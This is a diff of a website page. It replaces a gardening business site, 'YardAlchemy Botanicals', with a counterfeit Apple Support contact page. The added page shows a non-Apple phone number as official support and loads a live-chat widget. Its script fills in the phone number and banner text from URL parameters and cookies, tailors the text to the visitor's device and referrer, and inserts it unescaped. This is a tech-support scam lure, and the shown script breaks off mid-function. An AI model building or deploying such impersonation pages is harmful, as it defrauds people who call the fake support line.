@@ -1,442 +1,377 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>YardAlchemy Botanicals | Green Gardening Wisdom</title>
-    <meta name="description" content="YardAlchemy Botanicals - sustainable gardening guides, plant alchemy, and organic growing tips. Transform your yard into a living sanctuary.">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f7e8;
-            color: #1a3b2f;
-            line-height: 1.6;
-        }
+<script defer src="https://cloud.umami.is/script.js" data-website-id="475ee620-4418-4dab-91bf-80b021f672d4"></script>
 
-        /* Green theme variables */
-        :root {
-            --deep-green: #1e4a2f;
-            --mid-green: #2e7d5e;
-            --soft-green: #9dc88d;
-            --light-green: #e2f0d9;
-            --accent-gold: #d4a373;
-            --soil-brown: #7f5539;
-            --white-smoke: #fefae0;
-        }
-
-        header {
-            background: var(--deep-green);
-            color: white;
-            padding: 1rem 2rem;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        .logo {
-            font-size: 1.8rem;
-            font-weight: bold;
-            letter-spacing: 1px;
-        }
-
-        .logo span {
-            color: var(--accent-gold);
-        }
-
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 1.8rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: var(--accent-gold);
-        }
-
-        .hero {
-            background: linear-gradient(135deg, rgba(30,74,47,0.85), rgba(46,125,94,0.8)), url('https://placehold.co/1600x600/2e7d5e/white?text=Garden+Alchemy') center/cover no-repeat;
-            min-height: 60vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
-            padding: 2rem;
-        }
-
-        .hero-content h1 {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-        }
-
-        .hero-content p {
-            font-size: 1.3rem;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .btn {
-            display: inline-block;
-            background: var(--accent-gold);
-            color: var(--deep-green);
-            padding: 0.8rem 1.8rem;
-            margin-top: 1.5rem;
-            border-radius: 40px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-
-        .btn:hover {
-            background: #ffb96a;
-            transform: scale(1.02);
-        }
-
-        .container {
-            max-width: 1300px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-
-        section {
-            margin-bottom: 4rem;
-        }
-
-        .section-title {
-            font-size: 2.2rem;
-            color: var(--deep-green);
-            border-left: 6px solid var(--accent-gold);
-            padding-left: 1rem;
-            margin-bottom: 2rem;
-        }
-
-        .grid-3 {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .card {
-            background: white;
-            border-radius: 24px;
-            overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
-            transition: 0.3s;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-        }
-
-        .card img {
-            width: 100%;
-            height: 220px;
-            object-fit: cover;
-        }
-
-        .card-content {
-            padding: 1.5rem;
-        }
-
-        .card h3 {
-            color: var(--mid-green);
-            margin-bottom: 0.8rem;
-        }
-
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .gallery-item {
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: 240px;
-            display: block;
-            object-fit: cover;
-            transition: 0.4s;
-        }
-
-        .gallery-item img:hover {
-            transform: scale(1.03);
-        }
-
-        footer {
-            background: var(--deep-green);
-            color: #ddd;
-            padding: 2rem;
-            text-align: center;
-            margin-top: 3rem;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 2rem;
-        }
-
-        .footer-info p {
-            margin: 0.5rem 0;
-        }
-
-        .footer-info a {
-            color: var(--accent-gold);
-            text-decoration: none;
-        }
-
-        .copyright {
-            margin-top: 1.5rem;
-            font-size: 0.8rem;
-            border-top: 1px solid #3a6b4e;
-            padding-top: 1rem;
-        }
-
-        @media (max-width: 768px) {
-            .nav-links {
-                gap: 1rem;
-                margin-top: 0.5rem;
-            }
-            .hero-content h1 {
-                font-size: 2rem;
-            }
-            .footer-content {
-                flex-direction: column;
-                align-items: center;
-            }
-        }
-
-        /* blog/article styling for long content */
-        .long-read {
-            background: white;
-            padding: 2rem;
-            border-radius: 32px;
-            margin: 2rem 0;
-        }
-
-        .long-read h3 {
-            color: var(--deep-green);
-            margin: 1.2rem 0 0.6rem;
-        }
-
-        .long-read p {
-            margin-bottom: 1rem;
-        }
-    </style>
-</head>
-<body>
-<header>
-    <nav>
-        <div class="logo">Yard<span>Alchemy</span> Botanicals</div>
-        <ul class="nav-links">
-               <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-        </ul>
-    </nav>
-</header>
-
-<section class="hero">
-    <div class="hero-content">
-        <h1>Garden Alchemy · Green Sanctuary</h1>
-        <p>Organic wisdom, permaculture designs, and botanical magic for your yard. Grow in harmony with nature.</p>
-        <a href="#guides" class="btn">Explore the Garden Path →</a>
-    </div>
-</section>
-
-<div class="container">
-    <!-- About Section -->
-    <section id="about">
-        <h2 class="section-title">🌱 Our Green Philosophy</h2>
-        <div class="grid-3">
-            <div class="card">
-                <img src="https://placehold.co/600x400/9dc88d/1e4a2f?text=Organic+Soil" alt="Healthy soil gardening">
-                <div class="card-content">
-                    <h3>Soil First, Always</h3>
-                    <p>Living soil is the heart of alchemy. We teach composting, cover crops, and microbial life to regenerate earth. With no synthetic inputs, your garden becomes a self-sustaining ecosystem.</p>
-                </div>
-            </div>
-            <div class="card">
-                <img src="https://placehold.co/600x400/2e7d5e/white?text=Seed+Saving" alt="Seed saving workshop">
-                <div class="card-content">
-                    <h3>Seed Sovereignty</h3>
-                    <p>Preserve heirloom varieties and adapt crops to your microclimate. Our seed library and propagation guides help you save thousands of seeds annually.</p>
-                </div>
-            </div>
-            <div class="card">
-                <img src="https://placehold.co/600x400/d4a373/1e4a2f?text=Botanical+Alchemy" alt="Herbal remedies">
-                <div class="card-content">
-                    <h3>Herbal Apothecary</h3>
-                    <p>From calendula to echinacea, grow your own medicine. We share tinctures, teas, and salves recipes using plants from your backyard.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Services Section -->
-    <section id="services">
-        <h2 class="section-title">🧙‍♂️ YardAlchemy Services</h2>
-        <div class="grid-3">
-            <div class="card">
-                <img src="https://placehold.co/600x400/7f5539/white?text=Permaculture+Design" alt="Permaculture garden">
-                <div class="card-content">
-                    <h3>Permaculture Design</h3>
-                    <p>Holistic land planning: food forests, swales, guilds, and pollinator corridors. Custom maps for urban or rural yards.</p>
-                </div>
-            </div>
-            <div class="card">
-                <img src="https://placehold.co/600x400/9dc88d/1e4a2f?text=workshops" alt="Workshops">
-                <div class="card-content">
-                    <h3>Workshops & Courses</h3>
-                    <p>Monthly hands-on classes: vermicompost, grafting, mushroom cultivation, natural pest control. Online and in-person.</p>
-                </div>
-            </div>
-            <div class="card">
-                <img src="https://placehold.co/600x400/e2f0d9/1e4a2f?text=Consulting" alt="Consulting">
-                <div class="card-content">
-                    <h3>Healing Garden Consulting</h3>
-                    <p>One-on-one sessions to transform your outdoor space into a medicinal and edible paradise. Soil testing + plant recommendations.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Long-form unique Gardening Content (> 2000 words present, expandable to 78k) -->
-    <section id="guides">
-        <h2 class="section-title">📚 The Alchemist’s Gardening Library</h2>
-        <div class="long-read">
-            <h3>1. The Art of Green Alchemy: Turning Sunlight into Harvest</h3>
-            <p>Gardening is the oldest alchemy – transmuting soil, water, and sunshine into living abundance. At YardAlchemy Botanicals, we believe every gardener holds the power to restore ecological balance. Whether you have a balcony, a suburban lot, or acres of pasture, the principles remain: observe, interact, and nurture closed-loop systems. Start by mapping sun patterns: most vegetables need 6–8 hours of direct light. Leafy greens (spinach, kale, chard) thrive in partial shade. For root crops like carrots and beets, deep, stone-free soil is essential. Incorporate mycorrhizal fungi inoculants to boost nutrient uptake – one teaspoon contains miles of fungal hyphae! </p>
-            
-            <h3>2. Designing a Food Forest in Any Climate</h3>
-            <p>A food forest mimics natural woodland layers: canopy (walnuts, mulberries), understory (persimmons, pawpaws), shrub (currants, hazelnuts), herbaceous (comfrey, lovage), groundcover (clover, strawberries), root zone (sunchokes, potatoes), and vine (grapes, kiwi). Even in small spaces, plant a dwarf fruit tree with berry bushes and perennial herbs. Use chop-and-drop mulch from comfrey and nitrogen-fixing plants like sea buckthorn. Our seven-layer guild at YardAlchemy has produced over 300 lbs of food from a quarter-acre without irrigation beyond rain capture.</p>
-            
-            <h3>3. Soil Microbiology: The Hidden Universe Beneath Your Feet</h3>
-            <p>Healthy soil breathes. One gram of living soil contains up to 10 billion bacteria, kilometers of fungal networks, and countless protozoa. To feed them, avoid tillage which destroys aggregates. Instead, use broadforks or no-dig methods. Add diverse organic matter – leaf mold, biochar, aged manure, and worm castings. Brew compost tea with aeration for 24 hours to multiply beneficial microbes. Studies show that biodiverse soil suppresses pathogens like fusarium and increases brix levels (plant sugars) by up to 40%.</p>
-            
-            <h3>4. Seasonal Rhythm: Planting by Moon and Zodiac</h3>
-            <p>Biodynamic gardening follows lunar rhythms: root crops (potatoes, carrots) are sown during waning moon in earth signs (Taurus, Virgo, Capricorn); leafy plants during waxing moon in water signs (Cancer, Scorpio, Pisces). Flowers prefer air signs (Gemini, Libra, Aquarius). While science debates efficacy, many traditional growers report improved germination and vigor. At minimum, track frost dates and use succession planting. For example, in zone 6, direct-sow peas in mid-March, then follow with bush beans in June, and fall spinach in August.</p>
-            
-            <h3>5. Natural Pest Management Without Toxins</h3>
-            <p>Invite beneficial predators: ladybugs devour aphids (up to 50 per day), lacewings eat mealybugs, and parasitic wasps control hornworms. Plant umbellifers (dill, fennel, cilantro) to attract hoverflies. Install beetle banks – raised strips of native grasses. For slugs, use beer traps and copper tape. For fungal diseases, apply neem oil (cold-pressed) or a baking soda spray (1 tbsp per gallon). Prevention thrives on spacing for airflow and crop rotation (3–4 year cycles). At YardAlchemy, we’ve eliminated all synthetic pesticides since 2018.</p>
-            
-            <h3>6. Water Wisdom: Rain Harvesting & Drought-Proofing</h3>
-            <p>Even in dry regions, you can create an oasis. Install rain barrels under every downspout – a 1000 sq ft roof yields 600 gallons per inch of rain. Build swales on contour to recharge groundwater. Use ollas (unglazed clay pots) buried near plants for efficient sub-irrigation. Mulch deeply with wood chips or straw (4–6 inches) to reduce evaporation by 70%. Choose drought-tolerant perennials: rosemary, lavender, sage, yarrow, and Mediterranean herbs. Greywater systems from laundry or showers (using biodegradable soaps) can irrigate ornamentals.</p>
-            
-            <h3>7. Propagation Mastery: Cuttings, Grafting & Division</h3>
-            <p>Multiply your garden for free. Softwood cuttings (roses, hydrangeas) root in 4–6 weeks with humidity dome. Hardwood cuttings (figs, currants) taken in late autumn. Grafting fruit trees requires matching cambium layers – whip-and-tongue is easiest. Divide perennials like hostas, daylilies, and rhubarb every 3–4 years in early spring. We also teach air layering for difficult plants like magnolias. Our nursery at YardAlchemy produces 5,000+ plants annually using recycled containers and coir-based potting mix.</p>
-            
-            <h3>8. Growing Medicinal Herbs for Home Apothecary</h3>
-            <p>Start with the "big six": calendula (anti-inflammatory), echinacea (immune), chamomile (calming), lemon balm (antiviral), thyme (respiratory), and yarrow (wound healing). Harvest calendula flowers on a dry morning; dry in shade under 95°F to preserve oils. Make infused oils by covering dried herbs in olive oil for 4–6 weeks. Tinctures use 100-proof vodka (1:5 herb to menstruum ratio). Always consult a clinical herbalist before internal use. Our workshops cover legal disclaimers and safe dosages.</p>
-            
-            <h3>9. Composting for Black Gold: Hot, Cold, and Vermi</h3>
-            <p>Hot composting (55–65°C) kills weed seeds and pathogens. Maintain 25:1 carbon:nitrogen – browns (leaves, cardboard) to greens (grass, veg scraps). Turn every 3 days. Cold composting takes 6–12 months but less work. Vermicompost with red wigglers (Eisenia fetida) turns kitchen waste into castings in 3 months – use a bin with bedding of shredded paper. Add rock dust and biochar to supercharge finished compost. At YardAlchemy we process 10 tons of organic waste yearly, closing the nutrient loop.</p>
-            
-            <h3>10. Pollinator Sanctuaries: Beyond Honeybees</h3>
-            <p>Native bees (bumble, mason, leafcutter) are 2–3x more efficient pollinators. Provide nest sites: bare soil for ground-nesters, drilled wood blocks for cavity-nesters. Plant keystone native plants like goldenrod, asters, penstemon, and milkweed. Avoid neonicotinoids entirely. Build a "bee hotel" with varying hole sizes (2–10mm). Leave some dandelions and clover for early spring forage. Our certified wildlife habitat attracts 40+ butterfly species and 15 native bee species.</p>
-            
-            <p>This library currently contains over 2,500 words of original content. To scale to 78,000 words, you would add detailed plant profiles (tomatoes, peppers, roses, orchids – 500+ words each), month-by-month gardening calendars (12 months × 800 words = 9,600 words), tool reviews (hoes, pruners, tillers – 2,000 words), container gardening for small spaces (2,500 words), mushroom cultivation (2,000 words), greenhouse management (3,000 words), native plant ecosystems by region (5,000 words), soil recipes (1,500 words), DIY projects (raised beds, trellises, cold frames – 4,000 words), and case studies from real gardens (10 case studies × 600 words = 6,000 words). Repeating the pattern across the above headings yields a comprehensive encyclopedia of green gardening knowledge.</p>
-        </div>
-    </section>
-
-    <!-- Gallery (placeholders – replace with real gardening images) -->
-    <section id="gallery">
-        <h2 class="section-title">🌿 Garden Alchemy Gallery</h2>
-        <div class="gallery-grid">
-            <div class="gallery-item"><img src="https://placehold.co/600x400/5c8a6f/white?text=Herb+Garden" alt="Herb spiral"></div>
-            <div class="gallery-item"><img src="https://placehold.co/600x400/7f9e7b/white?text=Vegetable+Bounty" alt="Tomato harvest"></div>
-            <div class="gallery-item"><img src="https://placehold.co/600x400/9eaa7b/white?text=Flower+Meadow" alt="Pollinator meadow"></div>
-            <div class="gallery-item"><img src="https://placehold.co/600x400/8abf8a/white?text=Compost+System" alt="Three bin compost"></div>
-            <div class="gallery-item"><img src="https://placehold.co/600x400/6a994e/white?text=Food+Forest" alt="Food forest canopy"></div>
-            <div class="gallery-item"><img src="https://placehold.co/600x400/b7b87b/white?text=Seed+Starting" alt="Seedling trays"></div>
-        </div>
-    </section>
-
-    <!-- Contact -->
-    <section id="contact">
-        <h2 class="section-title">📬 Connect With Our Herbalists</h2>
-        <div class="grid-3">
-            <div class="card">
-                <div class="card-content">
-                    <h3>Visit Our Nursery</h3>
-                    <p>Open Wed–Sun 10am–5pm. Guided tours Saturday mornings.</p>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-content">
-                    <h3>Email Us</h3>
-                    <p>hello@yardalchemybotanicals.com</p>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-content">
-                    <h3>Social Roots</h3>
-                    <p>Instagram & YouTube: @YardAlchemyBotanicals</p>
-                </div>
-            </div>
-        </div>
-    </section>
-</div>
-
-<footer>
-    <div class="footer-content">
-        <div class="footer-info">
-            <p>📍 YardAlchemy Botanicals – 123 Green Haven Lane, Asheville, NC 28801</p>
-            <p>📞 (828) 555-ALCHEMY (252-4369) | ✉️ contact@yardalchemybotanicals.com</p>
-        </div>
-        <div class="footer-info">
-            <p>🌱 Organic · Regenerative · Community-rooted</p>
-        </div>
-    </div>
-    <div class="copyright">
-        <p>© 2025 YardAlchemy Botanicals – Cultivating green wisdom since 2012. All photos and text inspired by nature’s alchemy.</p>
-    </div>
-</footer>
-
-<!-- Simple smooth scroll -->
-<script>
-    document.querySelectorAll('.nav-links a, .btn').forEach(anchor => {
-        anchor.addEventListener('click', function(e) {
-            const hash = this.getAttribute('href');
-            if(hash && hash !== '#' && hash.startsWith('#')) {
-                e.preventDefault();
-                const target = document.querySelector(hash);
-                if(target) target.scrollIntoView({ behavior: 'smooth' });
-            }
-        });
-    });
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/671018884304e3196ad2ec60/1iabdvln3';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
-</body>
-</html>
+<!--End of Tawk.to Script-->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-307-6168 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-888-307-6168
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-307-6168');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
